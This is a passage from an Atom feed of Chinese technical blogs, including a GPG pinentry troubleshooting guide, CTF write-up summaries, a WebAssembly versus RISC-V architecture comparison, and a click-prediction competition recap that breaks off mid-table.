<p>删除 gpg 文件夹，<strong>请确认已经导出密钥</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>重新安装<code>GPG Suite</code>，<strong>不需要手动安装 GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>导入密钥</p>
</li>
</ol>
<p>这时 <code>GPG Suite</code>应该已经可以正常工作了</p>
<hr>
<p><em>原始方案</em></p>
<p>首先测试<code>gpg</code>工作是否正常</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>如果出现下面的错误</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: 签名时失败： Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>说明<code>gpg</code>无法打开输入密码的窗口。在生成<code>gpg key</code>时，如果指定了密码，在签名时就需要输入。而这时<code>gpg</code>不知道从哪里读取输入，所以可以用以下的命令指定<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>这样就可以正常弹出输入密码的窗口。</p>
<hr>
<p>但我不喜欢这个全屏窗口，主要是在mac上<code>gpg</code>语言为中文时，这个窗口会乱码，所以用另一个方法解决。编辑<code>~/.gnupg/gpg.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>再编辑<code>~/.gnupg/gpg-agent.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>最后输入<code>echo RELOADAGENT | gpg-connect-agent</code>重启<code>agent</code>就生效了，这样可以直接在终端输入密码</p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/03/23/CTF_BJDCTF2nd/</id>
        <title><![CDATA[CTF | BJDCTF 2nd WriteUp]]></title>
        <updated>2020-03-28T16:52:32+08:00</updated>
        <link href="https://miaotony.xyz/2020/03/23/CTF_BJDCTF2nd/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/03/23/CTF_BJDCTF2nd/"><![CDATA[划水划水~周末水了一下BJDCTF 2nd，据说是萌新赛，于是来玩了一下，嗯让我知道了我的确就是萌新。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/03/28/Server_IssueACertWithACME/</id>
        <title><![CDATA[基于acme.sh从Let's encrypt生成免费且自动更新的SSL证书]]></title>
        <updated>2020-03-28T16:50:11+08:00</updated>
        <link href="https://miaotony.xyz/2020/03/28/Server_IssueACertWithACME/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/03/28/Server_IssueACertWithACME/"><![CDATA[通过Let's encrypt可以获得90天免费且可续期的SSL证书，而利用acme.sh可以自动生成和更新，这篇文章就来介绍一下配置的过程吧。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[重新开始]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>突然发现距上一篇blog发布已经过去了快一年的时间，原先的blog也疏于打理，只有寥寥几篇文章，图床基本失效。主要因为我比较懒，认真整理一篇blog也是费时费力的事情。但自己整理一些文章是很有意义的事情，能记录下自己的学习历程，总结知识，再次遇到相同的问题也可以回头参考。</p>
<p>blog一直没更新有个诱因是微博图床开启了防盗链，导致blog中许多图片都无法访问了<del>老王背锅</del>，又懒得修复。同时看上了<a href="https://gohugo.io/">hugo</a>这个框架，正好也在学习<code>golang</code>，就想从<code>hexo</code>更换到<code>hugo</code>。但这两个框架有个很大的区别<del>我觉得</del>，就是<code>hexo</code>是一堆前端工程师搞的，而<code>hugo</code>是一堆后端工程师搞的，这就导致了<code>hugo</code>没有啥好看的主题，也就一直鸽下去了。</p>
<p>去年年中的时候就打算和@queensferry写一个Hugo主题<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>，立项的时候很多想法，但做起来就不想动了。摸完页面框架后就鸽了，一方面实在不会设计，另一方面调各种样式是真的蛋疼。鸽了半年又捡起来<del>虽然我没写啥</del>，不过渐渐也有点样子了。但今天发现了一个很棒的主题<a href="https://github.com/Track3/hermit">hermit</a>，几乎就是我想要的，里面很多设计就是我当初构想的内容，马上捡起了blog。</p>
<p>这一年来也计划整理个人笔记软件，在尝试了数个软件后，有印象笔记，为知笔记，有道云笔记，onenote及一堆开源笔记应用，都不太满足我的需求。最后发现了notion这个东西贼香（主要对学生免费了），最后就选择了它。不过这也导致我手上一堆笔记分散在各处，打算后面整理清楚<del>水</del>几篇blog出来。</p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/</id>
        <title><![CDATA[CTF | XCTF高校战“疫”网络安全分享赛 WriteUp]]></title>
        <updated>2020-03-17T16:38:48+08:00</updated>
        <link href="https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/"><![CDATA[前不久水了一下XCTF的高校战“疫”网络安全分享赛，然而菜死了都没做出几道题，随便写点点WriteUp和感受吧。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/03/14/CTF_2020JetBrainsQuest3/</id>
        <title><![CDATA[CTF | JetBrains Quest 3 WriteUp/攻略]]></title>
        <updated>2020-03-17T16:11:26+08:00</updated>
        <link href="https://miaotony.xyz/2020/03/14/CTF_2020JetBrainsQuest3/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/03/14/CTF_2020JetBrainsQuest3/"><![CDATA[JetBrains Quest 3出来了，又来体验了一波，最后的礼品是20% discount on an All Products Pack subscription，这里随手写写攻略吧。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[WebAssembly 与 RISC-V 指令集架构的对比]]></title>
        <updated>2020-03-15T09:51:51+08:00</updated>
        <link href="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">A Comparison between WebAssembly and RISC-V</div><div class="kg-bookmark-description">WebAssembly and RISC-V are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Let’s do a comparison.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="WebAssembly 与 RISC-V 指令集架构的对比"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="WebAssembly 与 RISC-V 指令集架构的对比"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/wasm-riscv.png" alt="WebAssembly 与 RISC-V 指令集架构的对比"><p>WebAssembly 与 RISC-V 都是近十年内新出现的指令集架构。摘录一段 <a href="https://webassembly.org/">WebAssembly 官方网站</a>的介绍：</p><blockquote>WebAssembly (abbreviated <em><em>Wasm</em></em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><blockquote>WebAssembly （简写为 Wasm）是一种栈虚拟机的二进制指令格式。Wasm 被设计为 C/C++/Rust 等高级语言的可移植编译目标，从而允许客户端和服务器应用程序部署在 Web 上。</blockquote><p>和 <a href="https://riscv.org/">RISC-V 的官方介绍</a>：</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><blockquote>RISC-V 是一种自由、开放的指令集架构，通过开放标准协作使新的处理器创新成为可能。RISC-V 来自学术研究，提供了更加自由、可扩展的软硬件架构，为未来 50 年的计算技术设计与创新铺平道路。</blockquote><p>这两种指令集架构看起来很不一样。WebAssembly 的目标平台主要是 JIT 编译器（以及浏览器）；而 RISC-V 则专为硬件设计，其目标之一即是在 FPGA 和电路上的高效实现。WebAssembly 与 RISC-V 的关系似乎类似于早期的 Java 与 x86：一种字节码格式，和一个硬件指令集。它们有什么关系呢？</p><p>其实字节码格式与硬件指令集的分界线并不是非常清晰。例如在 x86 指令集的早期实现中，指令经过一层解码直接被分发到执行电路去执行。但近年的 Intel/AMD CPU 采用了不同的执行策略：每条 x86 指令首先被翻译为某种内部 RISC 指令，执行组件收到的指令其实已经是翻译后的 RISC 编码格式。这实际上相当于从 x86 到内部 RISC 指令集的某种“硬件实时编译”过程。同时，<a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> 与 <a href="https://github.com/piranna/wasmachine">WebAssembly</a> 也有实验性的硬件实现，虽然它们还不能赶上 JIT 编译器在现代 CPU 上所能达到的效率。</p><blockquote>我们已经可以看到 RISC-V 指令集<a href="https://github.com/nervosnetwork/ckb-vm">被用于区块链的智能合约</a>，而 WebAssembly 此前几乎是原生语言智能合约的唯一选择。</blockquote><p>在这里我们对 WebAssembly 与 RISC-V 做一个比较。</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">开源</font></strong></td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td><strong><font color="#512da8">内存架构</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">浮点支持</font></strong></td>
<td>是</td>
<td>是 (定义于扩展)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>是</td>
<td>是 (定义于扩展)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">代码/数据分离</font></strong></td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">指针宽度</font></strong></td>
<td>32</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">最大数据宽度</font></strong></td>
<td>64</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">静态类型</font></strong></td>
<td>弱</td>
<td>无</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">控制流约束</font></strong></td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">机器模型</font></strong></td>
<td>栈机</td>
<td>寄存器机</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">内存布局</font></strong></td>
<td>线性</td>
<td>分页</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">内存保护</font></strong></td>
<td>无</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">多线程同步</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">指令编码</font></strong></td>
<td>变长</td>
<td>定长 (2 或 4 字节)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">与环境交互</font></strong></td>
<td>导入函数</td>
<td>系统调用</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">可执行映像格式</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p><strong>1. 代码/数据分离</strong></p><p>包括 RISC-V 在内的大多数现代架构对代码和数据使用同一个地址空间，但是 WebAssembly 没有这样做。实际上，运行中的代码甚至没有办法读/写它自己。这个设计的原因可能是：</p><ul><li>简化 JIT 编译器的实现。如果代码可以自我修改，那么 JIT 编译器则需要有检测修改和重新生成目标代码的能力，而这需要相当复杂的实现机制。</li><li>WebAssembly 假设了一个功能完善的运行环境。运行环境会处理链接、重定位等准备工作，程序不需要关心怎样把它自己运行起来。</li><li>安全。能够动态生成和修改的代码是个很危险的攻击点。</li></ul><p><strong>2. 静态类型与控制流约束</strong></p><p>WebAssembly 具有很强的“结构性”。其标准要求所有函数调用、循环、跳转和值类型遵循特定的结构约束，例如向一个接受三个参数的函数传入两个参数、跳转到其他函数里的某个位置、在两个整数上执行浮点加操作等都会导致编译/验证失败。RISC-V 则不具有此类约束，指令的有效与否只取决于其自身的编码是否正确。</p><p><strong>3. 机器模型</strong></p><p>WebAssembly 是一种<a href="https://en.wikipedia.org/wiki/Stack_machine">栈机</a>指令集，而 RISC-V 是一种<a href="https://en.wikipedia.org/wiki/Register_machine">寄存器机</a>指令集。</p><p>在 WebAssembly 中，每条指令<em>语义上</em>会从值栈上弹出它的操作数，然后将结果推入值栈。然而与 Java 等其他基于栈机的字节码格式不同的是，程序中任意指令处值栈的结构都可以被静态确定。这一设计有利于更好的编译优化。</p><p>在 RISC-V 中，每条指令的编码包含 0 - 3 个寄存器编号 <code>rd, rs1, rs2</code> 。其中 <code>rs1</code>与 <code>rs2</code> 是输入寄存器， <code>rd</code> 是输出寄存器。除内存访问、特权指令等特殊类型指令外，每条指令只从输入寄存器中读取数据，在输出寄存器中存放结果。</p><p><strong>4. 内存管理</strong></p><p>虽然 WebAssembly 与 RISC-V 都定义了一个无类型的、字节可寻址的内存，它们之间还是有一些细节上的区别。WebAssembly 的内存等同于一个大数组：有效地址从 0 开始，连续扩展到某个由程序定义初值、可增长的上限。而 RISC-V 则使用了<a href="https://en.wikipedia.org/wiki/Virtual_memory">虚拟内存</a>，用页表将地址映射到物理内存。</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="WebAssembly 与 RISC-V 指令集架构的对比"><figcaption>内存布局</figcaption></figure><p>WebAssembly 的内存设计虽然简洁且易于实现，但存在一些问题：</p><ul><li>地址 0 是有效的，这会导致一些程序在解引用空指针时的行为与预期不同。</li><li>无法建立不映射到任何物理地址的“无效”地址区间，因此无法实现多线程环境下的栈保护页 (guard page) 。</li></ul><p><strong>5. 同步机制</strong></p><p>图灵完备的计算机器需要至少一条条件分支指令。同样，支持多线程同步的指令集架构需要至少一条“原子条件分支”指令。这类指令在 WebAssembly 下是 <code>i{32,64}.atomic.rmw.cmpxchg</code>，在 RISC-V 下是 <code>LR/SC</code>，分别对应 <a href="https://en.wikipedia.org/wiki/Compare-and-swap">CAS</a> 模型和 <a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LL/SC</a> 模型。</p><p>LL/SC 的语义比 CAS 更强。CAS 存在难以解决的 <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA 问题</a>，但 LL/SC 不受影响。这也意味着在 CAS 架构上模拟 LL/SC 比反过来要困难很多。</p><hr><blockquote>Note: 我写过一个 RISC-V 解释器 <a href="https://github.com/losfair/FlatRv">FlatRv</a> ，且正在参与一个 WebAssembly JIT 运行环境 <a href="https://github.com/wasmerio/wasmer">Wasmer</a> 的开发。如果你感兴趣可以点个 Star :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant 中文]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/</id>
        <title><![CDATA[CTF | JetBrains Quest 1&2 WriteUp/攻略]]></title>
        <updated>2020-03-13T16:43:42+08:00</updated>
        <link href="https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/"><![CDATA[体验了一下JetBrainsQuest1&2，白嫖了3+3个月的JB家全产品授权，这里记录一下通关过程，也算是攻略/WriteUp吧。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[A Comparison between WebAssembly and RISC-V]]></title>
        <updated>2020-03-13T16:38:53+08:00</updated>
        <link href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="A Comparison between WebAssembly and RISC-V"><p><a href="https://webassembly.org/">WebAssembly</a> and <a href="https://riscv.org/">RISC-V</a> are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Quoting the introduction to WebAssembly on <a href="https://webassembly.org">webassembly.org</a>:</p><blockquote>WebAssembly (abbreviated <em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><p>and the introduction to RISC-V on <a href="https://riscv.org">riscv.org</a>:</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><p>It seems that these two ISAs are quite different. WebAssembly is primarily targeted at JIT compilation and in particular, browsers, while RISC-V is designed for hardware and one of its goals is efficient implementation on FPGAs and circuits. They're like Java and x86 respectively in the old days: A bytecode format, and a hardware instruction set. How can they be related?</p><p>Well, the boundary between bytecodes and real hardware instruction sets is actually a bit blurred. The x86 instruction set, for example, was once executed directly by the circuits that performs control and arithmetic operations. But now on newer Intel and AMD CPUs, x86 instructions are decoded into a internal RISC format on-the-fly and sent into a RISC core for execution - isn't it some kind of hardware "JIT compilation" similar to what JRE does for Java? Meanwhile, there are also experimental hardware implementations for <a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> and <a href="https://github.com/piranna/wasmachine">WebAssembly</a>, though not being as efficient as what a JIT compiler can achieve on a modern, mature CPU.</p><p>Actually, people are already using RISC-V in a position where WebAssembly has usually been used for: smart contract on blockchains. It is the <a href="https://github.com/nervosnetwork/ckb-vm">CKB VM</a>. Across the blurred line between the WebAssembly bytecode format and the RISC-V hardware instruction set, what are the similarities, and what are the differences?</p><p>Let's do a comparison.</p><h3 id="feature-table">Feature table</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">Open source</font></strong></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><strong><font color="#512da8">Memory architecture</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">Floating point</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Separated code and data</font></strong></td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Pointer width</font></strong></td>
<td>32</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Maximum data width</font></strong></td>
<td>64</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Typing</font></strong></td>
<td>Weak</td>
<td>None</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Control flow</font></strong></td>
<td>Restricted</td>
<td>Arbitrary</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Machine model</font></strong></td>
<td>Stack</td>
<td>Register</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory layout</font></strong></td>
<td>Linear</td>
<td>Paged</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory protection</font></strong></td>
<td>None</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Synchronization primitive</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Instruction encoding</font></strong></td>
<td>Variable length</td>
<td>Fixed length (2 or 4 bytes)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Interaction with environment</font></strong></td>
<td>Imported functions</td>
<td>System call</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Executable image format</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The similarities are quite common, so I will focus on the differences here.</p><p><strong>1. Separated code and data</strong></p><p>Most modern architectures use a unique addressing space for code and data, including RISC-V. But WebAssembly doesn't, and actually the running code is not even provided with a way to access itself. Possible reasons:</p><ul><li>Simplicity for JIT compilation. If code can modify itself, then the JIT compiler needs to detect the modification and update the corresponding machine code - which is very complex.</li><li>WebAssembly's assumption about a powerful host environment. Linking, etc. will be done entirely by the host, and the program doesn't need to care about bringing itself up.</li><li>Security. Generating code at runtime is dangerous.</li></ul><p><strong>2. Typing and control flow</strong></p><p>WebAssembly is very "structured": The JIT compiler requires all function calls, loops, jumps and value types to conform to structural constraints. For example, you can't pass two values to a function that accepts three arguments, you can't jump to a location in another function, and you can't execute the floating point add instruction on two integers.</p><p>RISC-V however has none of these constraints. Everything is just values in registers and it's up to the programmer to decide how to use them.</p><p><strong>3. Machine model</strong></p><p>WebAssembly is built upon the <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> model, while RISC-V (along with most other hardware architectures) is a <a href="https://en.wikipedia.org/wiki/Register_machine">register machine</a>.</p><p>In WebAssembly, <em>semantically</em> any instruction pops its operands (if any) from the value stack, performs the defined operation, and pushes its results (if any) back on to the value stack. However, the structure of the value stack at any point in the program can be statically determined - which is different from the Java bytecode, for example, in that keeping the stack structure statically determinable is not an optimization but a compile-time mandatory requirement.</p><p><strong>4. Memory</strong></p><p>While both ISAs define an untyped, byte-addressable memory, some details are different. Memory in WebAssembly is literally a large byte array: addresses start from zero and continuously span to an upper limit (which can be dynamically increased by executing an instruction). In comparison, RISC-V uses <em><a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a></em> where page tables are used to map addresses to the underlying physical memory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="A Comparison between WebAssembly and RISC-V"><figcaption>Memory layouts</figcaption></figure><p>WebAssembly's memory model, although being simple to implement and efficient when JIT compiled, has several issues compared to RISC-V:</p><ul><li>Address zero is valid, causing programs that assume a crash for dereferencing the null pointer to misbehave.</li><li>No "gaps" are possible. Therefore the guard page trick to prevent stack overflow in a multi-threaded environment won't work.</li></ul><p>Virtual memory usually comes with memory protection where each memory page has a combination of <em>read</em>, <em>write</em> and <em>execute</em> permissions. This is an important security mechanism because it prevents execution and writes on memory regions where such operations aren't expected. RISC-V implements memory protection but WebAssembly does not - maybe it's less important in an architecture where executable code isn't addressable?</p><p><strong>5. Synchronization</strong></p><p>A computing machine needs at least one conditional branch instruction to be turing complete. Similarly, a multiprocessor architecture needs at least one "atomic conditional branch" instruction for proper synchronization. This instruction is <code>i{32,64}.atomic.rmw.<a href="https://en.wikipedia.org/wiki/Compare-and-swap">cmpxchg</a></code> in WebAssembly, and <code><a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LR/SC</a></code> in RISC-V.</p><p><code>LR/SC</code> has stronger semantics than <code>cmpxchg</code>. With <code>cmpxchg</code> we have the famous <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>, but <code>LR/SC</code> is not affected. It also means that emulating <code>LR/SC</code> with a <code>cmpxchg</code>-only architecture is much more difficult than the other way; something like a global lock or transactional memory has to be used, greatly increasing the complexity. RISC-V is designed for hardware anyway, but if you ever want to write a software implementation you will have to work around this issue.</p><hr><blockquote>Side note: I worked on/am working on both a RISC-V interpreter, <a href="https://github.com/losfair/FlatRv">FlatRv</a>, and a full WebAssembly JIT runtime, <a href="https://github.com/wasmerio/wasmer">Wasmer</a>. Take a look at them and star if you like my work :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[图灵联邦视频点击预测大赛-赛后总结]]></title>
        <updated>2020-03-04T09:15:52+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：A, B榜第三。<br>比赛地址：<a href="https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch" target="_blank" rel="noopener">https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch</a><br>代码地址：<a href="https://github.com/LogicJake/tuling-video-click-top3" target="_blank" rel="noopener">https://github.com/LogicJake/tuling-video-click-top3</a></p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>移动互联网的快速发展，催生了海量视频数据的产生，也为用户提供了类型丰富的视频数据类型。面对如何从海量视频数据类型中选择用户喜欢的类型的这一难题，作为一家拥有海量视频素材和用户行为的数据公司，希望通过用户行为数据，用户特征，以及视频特征，可以在充足数据基础上精准的推荐给用户喜欢的视频类型。</p><p>本次竞赛的目的是以用户的视频行为数据为基础，构建推荐模型，参赛队伍则需要搭建个性化推荐模型。希望参赛队伍能够挖掘数据背后丰富的内涵，为移动用户在合适的时间、合适的地点精准推荐用户感兴趣的内容，提高用户在数据集上的点击行为。</p><p>参赛者通过构建推荐模型，预测待测试数据中用户在对应的视频上是否会产生点击行为。</p><h1 id="数据说明"><a href="#数据说明" class="headerlink" title="数据说明"></a>数据说明</h1><p>第一部分是用户在资讯全集上的移动端行为数据（D）。</p><p>训练数据包含了抽样出来的一定量用户在三天之内的移动端行为数据（D），评分数据是这些用户在之后一天对子集（P）的点击数据。参赛者要使用训练数据建立推荐模型，并输出用户在接下来一天点击行为的预测结果。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="数据探索"><a href="#数据探索" class="headerlink" title="数据探索"></a>数据探索</h2><p>通过数据来源，我们能够更清楚地了解数据，了解业务背景。比赛数据采集于一款叫“亿刻看点”的 APP，此 APP 安卓独占，因为其某些流氓操作在苹果那边应该过不了审。这款 APP 以阅读赚钱（看应用市场评论提现很困难）为吸引点吸引用户使用，但有些迷之操作，在使用过程中会出现广告和下载弹窗，甚至退出这款 APP 后也能给我弹（如图1左）。APP 推荐的视频大多是影视剪辑，没有任何时效性，推荐策略也很单一：推荐与上次点击相似的视频。从图1右可以看到，当我点击了“那年花开”的视频片段后，刷新之后再推荐的就是该影视剧相关。</p><center class="half">    <img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA.jpg" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA%E8%A7%86%E9%A2%91.gif" style="margin: auto;max-width: 30%;"/>    <div style="margin-top: 2%">图1 APP 使用展示</div></center><p>从一个用户的角度，这款 APP 的用户体验不佳，首先广告弹出，误触下载让我无法忍受，所以不可能持续使用。即使有些人为了赚钱使用，也有极大几率为了奖励去点击视频，这样会产生大量不可信的操作数据。当一个人的行为数据不可信，对其未来的点击预估也就无从谈起了。在比赛中也有类似的体会，许多 ctr 预估中使用的常规特征收益很低甚至无效。</p><p>回归到数据本身，训练集总共给出了从2019.11.08 ~ 2019.11.10的三天数据，需要预测2019.11.11的用户点击行为。首先观察一下新老用户分布，下表列出了9，10，11三天昨日老用户占比。可以看出昨日老用户占比还是挺高，所以在后面的特征工程做了大量针对用户昨日行为的特征。按道理说这种体验感不好的 APP，在用户手机上存活时间不会太长，应该不会存在这么高的老用户比例，也不知道是奖励起到了作用还是数据提供方特意筛选出一部分活跃用户。</p><table><thead><tr><th align="center">day</th><th align="center">昨日老用户比例</th></tr></thead><tbody><tr><td align="center">9</td><td align="center">0.6501773380623483</td></tr><tr><td align="center">10</td><td align="center">0.6388528497721992</td></tr><tr><td align="center">11</td><td 